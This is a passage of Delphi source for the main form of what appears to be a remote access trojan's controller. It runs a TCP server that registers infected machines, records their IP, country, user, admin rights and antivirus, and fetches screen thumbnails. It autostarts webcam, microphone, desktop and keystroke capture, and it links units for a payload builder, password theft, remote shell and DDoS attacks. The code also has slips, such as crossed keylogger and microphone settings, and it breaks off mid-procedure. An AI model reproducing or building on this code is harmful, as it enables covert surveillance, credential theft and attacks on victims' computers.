unit UnitMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, Menus, XPMan, IdThreadMgr, IniFiles, IdThreadMgrDefault,
  IdAntiFreezeBase, IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer,
  AppEvnts, sSkinManager, ExtCtrls, ExtCtrlsX, ImgList, MMSystem, jpeg, ShellAPI,
  CoolTrayIcon;
                        
const
  WM_CONNECTION_POPUP = WM_USER + 1;
  WM_DISCONNECTION_POPUP = WM_USER + 2;
  WM_ADD_CONNECTIONLOG = WM_USER + 3;

type
  TFormMain = class(TForm)
    lvConnections: TListView;
    xpmnfst1: TXPManifest;
    mm1: TMainMenu;
    A1: TMenuItem;
    O2: TMenuItem;
    L1: TMenuItem;
    C2: TMenuItem;
    S1: TMenuItem;
    N1: TMenuItem;
    C1: TMenuItem;
    N2: TMenuItem;
    pmMain: TPopupMenu;
    M1: TMenuItem;
    N3: TMenuItem;
    T1: TMenuItem;
    C3: TMenuItem;
    H2: TMenuItem;
    F1: TMenuItem;
    D1: TMenuItem;
    W1: TMenuItem;
    R1: TMenuItem;
    S3: TMenuItem;
    M2: TMenuItem;
    C4: TMenuItem;
    M3: TMenuItem;
    K1: TMenuItem;
    P2: TMenuItem;
    P3: TMenuItem;
    P4: TMenuItem;
    D2: TMenuItem;
    N4: TMenuItem;
    S6: TMenuItem;
    P5: TMenuItem;
    N5: TMenuItem;
    C5: TMenuItem;
    R3: TMenuItem;
    R4: TMenuItem;
    C6: TMenuItem;
    U3: TMenuItem;
    U4: TMenuItem;
    F2: TMenuItem;
    F3: TMenuItem;
    N6: TMenuItem;
    O1: TMenuItem;
    idtcpsrvr1: TIdTCPServer;
    idntfrz1: TIdAntiFreeze;
    idthrdmgrdflt1: TIdThreadMgrDefault;
    sknmngr1: TsSkinManager;
    pmTray: TPopupMenu;
    R5: TMenuItem;
    N7: TMenuItem;
    S8: TMenuItem;
    L2: TMenuItem;
    C8: TMenuItem;
    N8: TMenuItem;
    E3: TMenuItem;
    ilFlags: TImageList;
    U5: TMenuItem;
    ilThumbs: TImageList;
    S10: TMenuItem;
    T2: TMenuItem;
    S2: TMenuItem;
    F4: TMenuItem;
    E2: TMenuItem;
    U2: TMenuItem;
    F5: TMenuItem;
    F6: TMenuItem;
    E4: TMenuItem;
    F7: TMenuItem;
    dlgOpen1: TOpenDialog;
    F8: TMenuItem;
    P1: TMenuItem;
    D3: TMenuItem;
    cltrycn1: TCoolTrayIcon;
    procedure L1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormShow(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure A1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure R5Click(Sender: TObject);
    procedure L2Click(Sender: TObject);
    procedure S8Click(Sender: TObject);
    procedure C8Click(Sender: TObject);
    procedure E3Click(Sender: TObject);
    procedure S6Click(Sender: TObject);
    procedure T2Click(Sender: TObject);
    procedure lvConnectionsContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure idtcpsrvr1Execute(AThread: TIdPeerThread);
    procedure idtcpsrvr1Exception(AThread: TIdPeerThread;
      AException: Exception);
    procedure idtcpsrvr1Disconnect(AThread: TIdPeerThread);
    procedure M1Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure F1Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure W1Click(Sender: TObject);
    procedure M2Click(Sender: TObject);
    procedure K1Click(Sender: TObject);
    procedure P2Click(Sender: TObject);
    procedure C4Click(Sender: TObject);
    procedure M3Click(Sender: TObject);
    procedure P3Click(Sender: TObject);
    procedure P4Click(Sender: TObject);
    procedure S10Click(Sender: TObject);
    procedure E4Click(Sender: TObject);
    procedure F5Click(Sender: TObject);
    procedure F7Click(Sender: TObject);
    procedure F6Click(Sender: TObject);
    procedure P5Click(Sender: TObject);
    procedure U5Click(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure R4Click(Sender: TObject);
    procedure C6Click(Sender: TObject);
    procedure U3Click(Sender: TObject);
    procedure F2Click(Sender: TObject);
    procedure F8Click(Sender: TObject);
    procedure F3Click(Sender: TObject);
    procedure O1Click(Sender: TObject);
    procedure D2Click(Sender: TObject);
    procedure P1Click(Sender: TObject);
    procedure D3Click(Sender: TObject);
    procedure cltrycn1DblClick(Sender: TObject);
  private
    { Private declarations }
    function GetClientIndex: Integer;
    procedure RefreshThumbnails;
    procedure AddThumb(Li: TListItem; Bmp: TBitmap);
    procedure ReadReceivedDatas(AThread, AThreadNew: TIdPeerThread;
      ReceivedDatas: string);
    procedure BalloonInformation(Sender: TObject);
    procedure AddConnectionLog(var Msg: TMessage); message WM_ADD_CONNECTIONLOG;
    procedure ConnectionPopup(var Msg: TMessage); message WM_CONNECTION_POPUP;  
    procedure DisconnectionPopup(var Msg: TMessage); message WM_DISCONNECTION_POPUP;
    procedure CountConnections;
  public
    { Public declarations }
    ImagesList: TImageList; 
  end;

var
  FormMain: TFormMain;
  ActivePortList, ConnectionPassword: string;
  StartupListening, GeoIpLocalisation, SoundNotification,
  VisualNotification, MinimizeToTray, CloseToTray: Boolean;
  ThumbWidth, ThumbHeight: Integer;
  AutostartDesk, AutostartCam, AutostartMic,
  AutostartKeylogger, DeskThumb, EnableSkin: Boolean;
  SkinDirectory, SkinName: string;
  SkinHue, SkinSaturation: Integer;
  ConnectionLimit: Integer;

implementation

uses
  UnitSelectPorts, UnitConnection, UnitConstants, UnitSettings, UnitNotification,
  UnitConnectionsLog, UnitAbout, UnitBuilder, UnitTransfersManager, UnitCountry,
  UnitFunctions, UnitMoreInfos, UnitRepository, UnitTasksManager, UnitFilesManager,
  UnitRegistryEditor, UnitShell, UnitWebcam, UnitDesktop, UnitKeyboardInputs,
  UnitMicrophone, UnitMiscellaneous, UnitChat, UnitPasswords, UnitPortSniffer,
  UnitPortScanner, UnitScripts, UnitFtpManager, UnitStringCompression,
  UnitDdosAttack;

{$R *.dfm}

procedure TFormMain.L1Click(Sender: TObject);
begin
  FormSelectPorts.ShowModal;
end;

procedure TFormMain.S1Click(Sender: TObject);
var
  i: Integer;
begin
  FormSettings := TFormSettings.Create(Self);
  if FormSettings.ShowModal = IDCANCEL then Exit;
  StartupListening := FormSettings.chkStartup.Checked;
  GeoIpLocalisation := FormSettings.chkGeoip.Checked;
  SoundNotification := FormSettings.chkSound.Checked;
  VisualNotification := FormSettings.chkVisual.Checked;
  MinimizeToTray := FormSettings.chkMinnimizeToTray.Checked;
  CloseToTray := FormSettings.chkCloseToTray.Checked;
  ThumbWidth := FormSettings.seWidth.Value;
  ThumbHeight := FormSettings.seHeight.Value;
  AutostartDesk := FormSettings.chkDesktop.Checked;
  AutostartCam := FormSettings.chkCam.Checked;
  AutostartKeylogger := FormSettings.chkCam.Checked;
  AutostartMic := FormSettings.chkKeylogger.Checked;
  EnableSkin := FormSettings.chkSkin.Checked;
  SkinName := FormSettings.lblSkin.Caption;
  SkinHue := FormSettings.trckbrHue.Position;
  SkinSaturation := FormSettings.trckbrSaturation.Position;
  DeskThumb := FormSettings.chkThumbs.Checked;

  if EnableSkin = True then
  begin
    sknmngr1.SkinDirectory := SkinDirectory;
    sknmngr1.SkinName := SkinName;
    sknmngr1.HueOffset := SkinHue;
    sknmngr1.Saturation := SkinSaturation;
    sknmngr1.InstallHook;
    sknmngr1.Active := True;
  end
  else
  begin
    sknmngr1.UnInstallHook;
    sknmngr1.Active := False;
  end;

  if DeskThumb = False then
  begin
    lvConnections.SmallImages := ilFlags;
    lvConnections.Columns[0].Caption := 'Flag';
    lvConnections.Columns[0].Width := -2;
  end
  else
  begin
    ilThumbs.Clear;
    ilThumbs.Width := ThumbWidth;
    ilThumbs.Height := ThumbHeight;
    lvConnections.SmallImages := ilThumbs;
    lvConnections.Columns[0].Caption := 'Screen';
    lvConnections.Columns[0].Width := -2;
    for i := 0 to lvConnections.Items.Count - 1 do
    lvConnections.Items.Item[i].ImageIndex := -1;
    RefreshThumbnails;
  end;
end;

procedure TFormMain.FormCreate(Sender: TObject);
var
  IniFile: TIniFile;
  SHFileInfo: TSHFileInfo;
begin
  IniFile := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Settings.ini');

  Left := IniFile.ReadInteger('Main form', 'Left', 209);
  Height := IniFile.ReadInteger('Main form', 'Height', 360);
  Top := IniFile.ReadInteger('Main form', 'Top', 117);
  Width := IniFile.ReadInteger('Main form', 'Width', 696);

  StartupListening := IniFile.ReadBool('Settings', 'Startup listening', True);
  GeoIpLocalisation := IniFile.ReadBool('Settings', 'GeoIp localisation', False);
  SoundNotification := IniFile.ReadBool('Settings', 'Sound notification', False);
  VisualNotification := IniFile.ReadBool('Settings', 'Visual notification', True);
  MinimizeToTray := IniFile.ReadBool('Settings', 'Minimize to system tray', False);
  CloseToTray := IniFile.ReadBool('Settings', 'Close to system tray', False);
  ThumbWidth := IniFile.ReadInteger('Settings', 'Thumbnail width', 100);
  ThumbHeight := IniFile.ReadInteger('Settings', 'Thumbnail height', 64);
  EnableSkin := IniFile.ReadBool('Settings', 'Enable skin', False);
  SkinDirectory := IniFile.ReadString('Settings', 'Skin directory',
    ExtractFilePath(ParamStr(0)) + 'Skins');
  SkinName := IniFile.ReadString('Settings', 'Skin name', 'Opus.asz');
  SkinHue := IniFile.ReadInteger('Settings', 'Skin HUE', 0);
  SkinSaturation := IniFile.ReadInteger('Settings', 'Skin saturation', 0);
  AutostartDesk := IniFile.ReadBool('Settings', 'Autostart desktop capture', True);
  AutostartCam := IniFile.ReadBool('Settings', 'Autostart webcam capture', True);
  AutostartMic := IniFile.ReadBool('Settings', 'Autostart microphone capture', True);
  AutostartKeylogger := IniFile.ReadBool('Settings', 'Autostart keyboard capture', True);
  DeskThumb := IniFile.ReadBool('Settings', 'Desktop thumbnail', False);

  ActivePortList := IniFile.ReadString('Listening port', 'Active ports list', '80|81|');
  ConnectionPassword := IniFile.ReadString('Listening port', 'Connection password', '');
  ConnectionLimit := IniFile.ReadInteger('Listening port', 'Connection limit', 50);
                                                  
  FtpHost := IniFile.ReadString('Files manager', 'Ftp host', 'ftp.host.com');
  FtpUser := IniFile.ReadString('Files manager', 'Ftp user', 'Username');
  FtpPass := IniFile.ReadString('Files manager', 'Ftp pass', 'Password');
  FtpDir := IniFile.ReadString('Files manager', 'Ftp directory', '');
  FtpPort := IniFile.ReadInteger('Files manager', 'Ftp port', 21);
  
  IniFile.Free;
                                                   
  Application.OnMinimize := BalloonInformation;
  ConnectionList := TList.Create;

  FileIconInit(True);
  ImagesList := TImageList.CreateSize(16, 16);
  ImagesList.ShareImages := True;
  ImagesList.Handle := SHGetFileInfo('', FILE_ATTRIBUTE_NORMAL, SHFileInfo,
    SizeOf(SHFileInfo), SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES or SHGFI_SYSICONINDEX);
end;

procedure TFormMain.FormClose(Sender: TObject; var Action: TCloseAction);
var
  i: Integer;
  IniFile: TIniFile;
  TmpStr: string;
begin
  IniFile := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Settings.ini');

  IniFile.WriteInteger('Main form', 'Left', Left);
  IniFile.WriteInteger('Main form', 'Top', Top);
  IniFile.WriteInteger('Main form', 'Width', Width);
  IniFile.WriteInteger('Main form', 'Height', Height);

  IniFile.WriteBool('Settings', 'Startup listening', StartupListening);  
  IniFile.WriteBool('Settings', 'GeoIp localisation', GeoIpLocalisation);
  IniFile.WriteBool('Settings', 'Sound notification', SoundNotification);
  IniFile.WriteBool('Settings', 'Visual notification', VisualNotification);
  IniFile.WriteBool('Settings', 'Minimize to system tray', MinimizeToTray);
  IniFile.WriteBool('Settings', 'Close to system tray', CloseToTray);
  IniFile.WriteBool('Settings', 'Autostart desktop capture', AutostartDesk);
  IniFile.WriteBool('Settings', 'Autostart webcam capture', AutostartCam);
  IniFile.WriteBool('Settings', 'Autostart microphone capture', AutostartMic);
  IniFile.WriteBool('Settings', 'Autostart keyboard capture', AutostartKeylogger);
  IniFile.WriteBool('Settings', 'Enable skin', EnableSkin);
  IniFile.WriteInteger('Settings', 'Thumbnail width', ThumbWidth);
  IniFile.WriteInteger('Settings', 'thumbnail height', ThumbHeight);
  IniFile.WriteString('Settings', 'Skin name', SkinName);
  IniFile.WriteString('Settings', 'Skin directory', SkinDirectory);
  IniFile.WriteInteger('Settings', 'Skin HUE', SkinHue);
  IniFile.WriteInteger('Settings', 'Skin saturation', SkinSaturation);
  IniFile.WriteBool('Settings', 'Desktop thumbnail', DeskThumb);

  IniFile.WriteString('Listening port', 'Active ports list', ActivePortList);
  IniFile.WriteString('Listening port', 'Connection password', ConnectionPassword);
  IniFile.WriteInteger('Listening port', 'Connection limit', ConnectionLimit);

  IniFile.WriteString('Files manager', 'Ftp host', FtpHost);
  IniFile.WriteString('Files manager', 'Ftp user', FtpUser);
  IniFile.WriteString('Files manager', 'Ftp pass', FtpPass);
  IniFile.WriteString('Files manager', 'Ftp directory', FtpDir);
  IniFile.WriteInteger('Files manager', 'Ftp port', FtpPort);

  IniFile.Free;

  ConnectionList.Free;

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Connections Logs';
  if not DirectoryExists(TmpStr) then CreateDir(TmpStr);

  TmpStr := TmpStr + '\' + MyGetDate('-') + '.txt';
  if FormConnectionsLog.RetrieveLogs = '' then Exit;
  if FileExists(TmpStr) then WriteTextFile(TmpStr, FormConnectionsLog.RetrieveLogs) else
  CreateTextFile(TmpStr, FormConnectionsLog.RetrieveLogs);

  ExitProcess(0);
end;

procedure TFormMain.FormShow(Sender: TObject);
var
  Port: string;
  i: Integer;
begin
  FormMain.Caption := PROGRAMNAME + ' ' + PROGRAMVERSION + ' - Connected: 0';
  FormSelectPorts.edt1.Text := ConnectionPassword;
  FormSelectPorts.se2.Value := ConnectionLimit;

  if StartupListening = True then
  begin
    if ActivePortList = '' then Exit;
    while ActivePortList <> '' do
    begin
      Port := Copy(ActivePortList, 1, Pos('|', ActivePortList)-1);
      FormSelectPorts.AddPort(StrToInt(Port));
      Delete(ActivePortList, 1, Pos('|', ActivePortList));
    end;
  end;

  if EnableSkin = True then
  begin
    sknmngr1.SkinDirectory := SkinDirectory;
    sknmngr1.SkinName := SkinName;
    sknmngr1.HueOffset := SkinHue;
    sknmngr1.Saturation := SkinSaturation;
    sknmngr1.InstallHook;
    sknmngr1.Active := True;
  end;

  if DeskThumb = True then
  begin
    ilThumbs.Clear;
    ilThumbs.Width := ThumbWidth;
    ilThumbs.Height := ThumbHeight;
    lvConnections.SmallImages := ilThumbs;
    lvConnections.Columns[0].Caption := 'Screen';
    lvConnections.Columns[0].Width := -2;
    for i := 0 to lvConnections.Items.Count - 1 do
    lvConnections.Items.Item[i].ImageIndex := -1;
  end;
end;

procedure TFormMain.BalloonInformation(Sender: TObject);
begin
  if MinimizeToTray = False then Exit;
  
  cltrycn1.HideTaskbarIcon;
  FormMain.Hide;
  cltrycn1.ShowBalloonHint(PROGRAMNAME + ' ' + PROGRAMVERSION,
                           'Connected: ' + IntToStr(ConnectionList.Count),
                           bitInfo, 10);
end;

procedure TFormMain.CountConnections;
begin
  Caption := PROGRAMNAME + ' ' + PROGRAMVERSION + ' - Connected: ' +
             IntToStr(ConnectionList.Count);
end;
       
procedure TFormMain.AddConnectionLog(var Msg: TMessage);
var
  TmpItem: TListItem;
  TmpStr: String;
begin
  TmpStr := string(Msg.WParam);
  TmpItem := FormConnectionsLog.lv1.Items.Add;
  TmpItem.Caption := TimeToStr(Time);
  TmpItem.SubItems.Add(TmpStr);
end;

procedure TFormMain.ConnectionPopup(var Msg: TMessage);
var
  TmpForm: TFormNotification;
  TmpStr: string;
  r: TRect;
begin
  TmpStr := string(Msg.WParam);
  TmpStr := 'Client connected |' + TmpStr;

  TmpForm := TFormNotification.Create(Self, TmpStr);
  SystemParametersInfo(SPI_GETWORKAREA, 0, @r, 0);
  TmpForm.Left := r.Right - TmpForm.Width;
  TmpForm.Top := r.Bottom;
  TmpForm.PosY := TmpForm.Top - TmpForm.Height;
  TmpForm.Active := True;

  TmpForm.pnl1.Color := clBlue;
  TmpForm.img1.Grayed := False;
  TmpForm.lblTitle.Font.Color := clBlue;
  TmpForm.lblIp.Font.Color := clBlue;
  TmpForm.lblId.Font.Color := clBlue;
  TmpForm.lblCountry.Font.Color := clBlue;
  TmpForm.lblWindows.Font.Color := clBlue;

  TmpForm.Show;
  TmpForm.tmr1.Enabled := True;
end;
 
procedure TFormMain.DisconnectionPopup(var Msg: TMessage);
var
  TmpForm: TFormNotification;
  TmpStr: string;
  r: TRect;
begin
  TmpStr := string(Msg.WParam);  
  TmpStr := 'Client disconnected |' + TmpStr;

  TmpForm := TFormNotification.Create(Self, TmpStr);
  SystemParametersInfo(SPI_GETWORKAREA, 0, @r, 0);
  TmpForm.Left := r.Right - (TmpForm.Width * 2);
  TmpForm.Top := r.Bottom;
  TmpForm.PosY := TmpForm.Top - TmpForm.Height;
  TmpForm.Active := True;

  TmpForm.pnl1.Color := clBlack;
  TmpForm.img1.Grayed := True;
  TmpForm.lblTitle.Font.Color := clBlack;
  TmpForm.lblIp.Font.Color := clBlack;
  TmpForm.lblId.Font.Color := clBlack;
  TmpForm.lblCountry.Font.Color := clBlack;
  TmpForm.lblWindows.Font.Color := clBlack;

  TmpForm.Show;
  TmpForm.tmr1.Enabled := True;
end;
              
procedure _SoundNotification;
begin
  PlaySound(PChar(1), hInstance, SND_ASYNC or SND_MEMORY or SND_RESOURCE);
end;

procedure TFormMain.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  if CloseToTray = False then CanClose := True else
  begin
    CanClose := False;
    BalloonInformation(Sender);
  end;
end;

procedure TFormMain.A1Click(Sender: TObject);
begin
  FormAbout.lblVersion.Caption := PROGRAMVERSION;
  FormAbout.Show;
end;

procedure TFormMain.C1Click(Sender: TObject);
begin
  FormBuilder.ShowModal;
end;

procedure TFormMain.C2Click(Sender: TObject);
begin
  FormConnectionsLog.Show;
end;

procedure TFormMain.R5Click(Sender: TObject);
begin
  Application.Restore;
end;

procedure TFormMain.L2Click(Sender: TObject);
begin
  L1.Click;
end;

procedure TFormMain.S8Click(Sender: TObject);
begin
  S1.Click;
end;

procedure TFormMain.C8Click(Sender: TObject);
begin
  C1.Click;
end;

procedure TFormMain.E3Click(Sender: TObject);
begin
  OnCloseQuery := nil;
  Close;
end;

procedure TFormMain.S6Click(Sender: TObject);
begin
  lvConnections.SelectAll;
end;
         
procedure TFormMain.cltrycn1DblClick(Sender: TObject);
begin
  R5.Click;
end;

procedure TFormMain.T2Click(Sender: TObject);
begin
  FormTransfersManager.Show;
end;

procedure TFormMain.lvConnectionsContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvConnections.Selected) then
  begin
    for i := 0 to pmMain.Items.Count - 1 do pmMain.Items[i].Enabled := False;
    if lvConnections.Items.Count > 0 then pmMain.Items[11].Enabled := True;
    pmMain.Items[15].Enabled := True;
  end
  else
  begin
    for i := 0 to pmMain.Items.Count - 1 do pmMain.Items[i].Enabled := True;
    for i := 0 to lvConnections.Items.Count - 1 do
    if lvConnections.Items.Item[i].SubItems[10] = 'Yes' then pmMain.Items[9].Enabled := False;
  end;
end;

function TFormMain.GetClientIndex: Integer;
var
  i: Integer;
begin
  Result := -1;
  if not Assigned(lvConnections.Selected) then Exit;
  for i := 0 to ConnectionList.Count - 1 do
  begin
    if PConnectionDatas(ConnectionList[i]).Items = lvConnections.Selected then
    begin
      Result := i;
      Break;
    end;
  end;
end;

procedure TFormMain.RefreshThumbnails;
var
  ConnDatas: PConnectionDatas;
  i: Integer;
begin
  if ConnectionList.Count = 0 then Exit;
  for i := 0 to ConnectionList.Count - 1 do
  begin
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, DESKTOPTHUMBNAIL + '|' +
              IntToStr(ThumbWidth) + '|' + IntToStr(ThumbHeight));
  end;
end;
      
procedure TFormMain.AddThumb(Li: TListItem; Bmp: TBitmap);
begin
  if Li.ImageIndex = -1 then
    try Li.ImageIndex := ilThumbs.Add(Bmp, nil); except end
  else try ilThumbs.Replace(Li.ImageIndex, Bmp, nil); except end;
end;

procedure TFormMain.idtcpsrvr1Execute(AThread: TIdPeerThread);
var
  ConnDatas: PConnectionDatas;
  ReceivedDatas, TmpStr: string;
  i: Integer;
begin
  if AThread.Data = nil then
  begin
    if ConnectionList.Count = ConnectionLimit then AThread.Connection.Disconnect;

    ReceivedDatas := ReceiveDatas(AThread);
    if ReceivedDatas = '' then Exit;

    SendMessage(Handle, WM_ADD_CONNECTIONLOG,
                Integer('Connection attempt from socket(' +
                         IntToStr(AThread.Connection.Socket.Binding.Handle) + ')'), 0);

    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    if TmpStr <> ConnectionPassword then
    begin
      SendMessage(Handle, WM_ADD_CONNECTIONLOG,
                  Integer('Connection refused from ' + AThread.Connection.Socket.Binding.PeerIP +
                          ' on port '+ IntToStr(AThread.Connection.Socket.Binding.Port) +
                          ' with socket(' + IntToStr(AThread.Connection.Socket.Binding.Handle) +
                          '): Wrong password.'),
                  0);
      AThread.Connection.Disconnect;
      Exit;
    end;

    SendMessage(Handle, WM_ADD_CONNECTIONLOG,
                Integer('Connection accepted from ' + AThread.Connection.Socket.Binding.PeerIP +
                        ' on port '+ IntToStr(AThread.Connection.Socket.Binding.Port) +
                        ' with socket(' + IntToStr(AThread.Connection.Socket.Binding.Handle) +
                        '): Correct password.'),
                0);

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = CLIENTNEW then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      for i := 0 to ConnectionList.Count do
      begin
        if PConnectionDatas(ConnectionList[i]).Identification = TmpStr then
        begin
          ConnDatas := PConnectionDatas(ConnectionList[i]);
          ReadReceivedDatas(ConnDatas.AThread, AThread, ReceivedDatas);
          Break;
        end;
      end;
    end;

    AThread.Connection.WriteLn(' ');

    GetMem(ConnDatas, SizeOf(TConnectionDatas));
    try
      ConnDatas.AThread := AThread;
      ConnDatas.Socket := AThread.Connection.Socket.Binding.Handle;
      ConnDatas.Items := nil;
      ConnDatas.Ping := GetTickCount;
      for i := 0 to High(ConnDatas.Forms) do ConnDatas.Forms[i] := nil;
      ConnectionList.Add(ConnDatas);

      AThread.Data := TObject(ConnDatas);
    except
    end;

    SendDatas(AThread, INFOSMAIN + '|');
  end
  else
  begin
    ReceivedDatas := ReceiveDatas(AThread);
    if ReceivedDatas = '' then Exit;
    ReadReceivedDatas(AThread, AThread, ReceivedDatas);
  end;
end;

procedure TFormMain.ReadReceivedDatas(AThread, AThreadNew: TIdPeerThread;
  ReceivedDatas: string);
var
  TmpItem: TListItem;
  MainCommand: string;
  ConnDatas: PConnectionDatas;
  ConnInfos: TConnectionInfos;
  InfosList: array[0..16] of string;
  Stream: TMemoryStream;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
  TmpStr: string;
  TmpInt, i: Integer;
  TmpRes: TResourceStream;
  FileTransfer: TTransfersManager;
  TmpHandle: THandle;
begin
  ConnDatas := nil;
  ConnDatas := PConnectionDatas(AThread.Data);

  MainCommand := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

  if MainCommand = INFOSMAIN then
  begin
    for i := 0 to 16 do
    begin
      InfosList[i] := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    end;

    lvConnections.Items.BeginUpdate;
    TmpItem := lvConnections.Items.Add;
    TmpItem.Caption := IntToStr(AThread.Connection.Socket.Binding.Handle); //Socket handle
    TmpItem.SubItems.Add(InfosList[0] + ' / ' +
      AThread.Connection.Socket.Binding.PeerIP); //[0] Lan / Wan
    TmpItem.SubItems.Add(InfosList[1]); //[1] Port
    TmpItem.SubItems.Add(InfosList[2] + '(' +
      GetCountryName(InfosList[2]) + ')'); //[2] Country code + country name
    TmpItem.SubItems.Add(InfosList[3]); //[3] ClientId
    TmpItem.SubItems.Add(InfosList[5]); //[4] UserId
    TmpItem.SubItems.Add(InfosList[6]); //[5] Windows
    TmpItem.SubItems.Add(InfosList[7]); //[6] Admin rights
    TmpItem.SubItems.Add(InfosList[10]); //[7] Antivirus
    TmpItem.SubItems.Add(InfosList[11]); //[8] Webcam
    TmpItem.SubItems.Add(''); //[9] Ping
    TmpItem.SubItems.Add(InfosList[12]); //[10] Plugin status
    TmpItem.SubItems.Add(InfosList[13]); //[11] Client version
    TmpItem.SubItems.Add(InfosList[8]); //[12] Installed date
    TmpItem.ImageIndex := GetFlagIndex(InfosList[2]);

    if InfosList[11] = 'Yes' then TmpItem.SubItemImages[8] := 265 else
      TmpItem.SubItemImages[8] := 264;

    if GeoIpLocalisation = True then
    begin
      TmpStr := ExtractFilePath(ParamStr(0)) + 'GeoIP.dat';
      if not FileExists(TmpStr) then
      begin
        TmpRes := TResourceStream.Create(HInstance, 'GEOIP', 'geoipfile');
        TmpRes.SaveToFile(TmpStr);
        TmpRes.Free;
      end;

      TmpStr := GeoIpCountryName(AThread.Connection.Socket.Binding.PeerIP);
      if TmpStr <> '' then
      begin
        TmpItem.SubItems[4] := TmpStr;
        TmpItem.ImageIndex := GeoIpFlagIndex(TmpStr);
      end;
    end;

    lvConnections.Items.EndUpdate;

    ZeroMemory(@ConnInfos, SizeOf(TConnectionInfos));
    ConnInfos.LanIp := InfosList[0];
    ConnInfos.LocalPort := InfosList[1];
    ConnInfos.CountryCode := InfosList[2];
    ConnInfos.ClientId := InfosList[3];
    ConnInfos.PID := InfosList[4];
    ConnInfos.User_Computer := InfosList[5];
    ConnInfos.Windows := InfosList[6];
    ConnInfos.Admin := InfosList[7];
    ConnInfos.InstalledDate := InfosList[8];
    ConnInfos.RegKey := InfosList[9];
    ConnInfos.Antivirus := InfosList[10];
    ConnInfos.WebCam := InfosList[11];
    ConnInfos.Plugin := InfosList[12];
    ConnInfos.Version := InfosList[13];
    ConnInfos.ScreenRes := InfosList[14];
    ConnInfos.Foldername := InfosList[15];
    ConnInfos.Filename := InfosList[16];

    ConnDatas.Identification := TmpItem.SubItems[3] + '^(' + TmpItem.SubItems[4] + ')';
    ConnDatas.ConnInfos := ConnInfos;
    ConnDatas.ImageIndex := TmpItem.ImageIndex;
    TmpItem.Data := TObject(ConnDatas);
    ConnDatas.Items := TmpItem;
   
    if VisualNotification = True then
    begin
      SendMessage(Handle, WM_CONNECTION_POPUP,
                  Integer(TmpItem.SubItems[0] + '|' +
                          TmpItem.SubItems[4] + '|' +
                          TmpItem.SubItems[2] + '|' +
                          TmpItem.SubItems[5] + '|' +
                          IntToStr(TmpItem.ImageIndex) + '|'),
                  0);
    end;                       

    if SoundNotification = True then
    CreateThread(nil, 0, @_SoundNotification, nil, 0, TmpHandle);

    if DeskThumb = True then
    begin
      ConnDatas.Items.ImageIndex := -1;
      SendDatas(ConnDatas.AThread, DESKTOPTHUMBNAIL + '|' +
                IntToStr(ThumbWidth) + '|' + IntToStr(ThumbHeight));
    end;

    CountConnections;
  end
  else
   
  if MainCommand = INFOSREFRESH then
  begin
    ConnDatas.Items.SubItems[10] := ReceivedDatas;
  end
  else

  if MainCommand = PONG then
  begin
    i := GetTickCount - Cardinal(ConnDatas.Ping);
    ConnDatas.Items.SubItems[9] := IntToStr(i) + 'ms';
    if i < 100 then ConnDatas.Items.SubItemImages[9] := 261 else
    if i < 700 then ConnDatas.Items.SubItemImages[9] := 262 else
    ConnDatas.Items.SubItemImages[9] := 263;
  end
  else
     
  if MainCommand = CLIENTRENAME then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    if ReceivedDatas = 'Y' then ConnDatas.Items.SubItems[3] := TmpStr else
    begin
      MessageBox(Handle, PChar('Failed to rename client by ' + TmpStr + '.'),
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    end;
  end
  else

  if MainCommand = CLIENTUPDATEFROMLOCAL then
  begin                                       
    i := MyGetFileSize(ReceivedDatas);
    FileTransfer := TTransfersManager.Create(AthreadNew, ReceivedDatas, i, '', False, ConnDatas);
    FileTransfer.UploadFile;
  end
  else
  
  if MainCommand = DESKTOPTHUMBNAIL then
  begin
    if lvConnections.SmallImages = ilFlags then
    begin
      ilThumbs.Width := ThumbWidth;
      ilThumbs.Height := ThumbHeight;
      lvConnections.SmallImages := ilThumbs;
      lvConnections.Columns[0].Caption := 'Screen';
      lvConnections.Columns[0].Width := -2;
    end;

    Stream := TMemoryStream.Create;
    StrToStream(ReceivedDatas, Stream);
    Stream.Position := 0;

    try
      Jpg := TJPEGImage.Create;
      Jpg.LoadFromStream(Stream);
      Stream.Free;
      Bmp := TBitmap.Create;
      Bmp.Width := Jpg.Width;
      Bmp.Height := Jpg.Height;
      Bmp.Canvas.Draw(0, 0, Jpg);
